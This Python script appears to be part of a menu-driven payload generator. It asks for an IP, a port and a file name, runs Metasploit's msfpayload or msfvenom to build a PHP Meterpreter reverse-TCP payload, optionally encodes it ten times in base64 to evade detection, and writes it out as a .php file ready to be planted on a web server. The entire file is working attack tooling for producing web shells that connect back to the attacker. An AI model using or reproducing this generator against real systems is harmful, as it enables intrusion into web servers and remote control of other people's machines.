#!/usr/bin/python
#
import os
import subprocess as subp
from src import menus
from src.main import *
from time import sleep

# interface ip
iface = iface_ip()
	
while 1:
	try:
		# select payload
		selection = 0
		while selection != range(1,4):
			clear()
			menus.php_menu()
			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "php/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "php/meterpreter_reverse_tcp"
				break
			if selection == '3' or selection =='':
				payload = "php/meterpreter/reverse_tcp"
				break
		
		# get some payload info
		ip = raw_input("\nEnter your local or remote ip (%s): " % iface)
		if not ip:
			ip = iface
		port = raw_input("Enter a port (default 8080): ")
		if not port:
			port = 8080
		filename = raw_input("Enter a name for php file: ")
		if not filename:
			filename = "paygen-pl.php"
		else:
			filename += ".php"
		
		# create payload
		if selection == '1' or selection == '2':
			PrintInfo("Creating payload please wait...")
			proc = subp.Popen("%s/msfpayload %s lhost=%s lport=%s R" % (msfpath(), payload, ip, port), shell=True, stdout=subp.PIPE)
			code = proc.communicate()[0]
			finalpl = "<?php\n\n" + code + "\n\n?>"
			f = open("output/"+filename, "w")
			f.write(finalpl)
			f.close()
			
		elif selection == '3' or selection =='':
			PrintInfo("Creating payload with x10 base64. Please wait...")
			proc = subp.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e php/base64 -i 10 -f raw" % (msfpath(), payload, ip, port), stdout=subp.PIPE, shell=True)
			code = proc.communicate()[0]
			finalpl = "<?php\n\n" + code + "\n\n?>"
			f = open("output/"+filename, "w")
			f.write(finalpl)
			f.close()
	
		# return to main
		EntContinue()
		break
	except KeyboardInterrupt:
		break
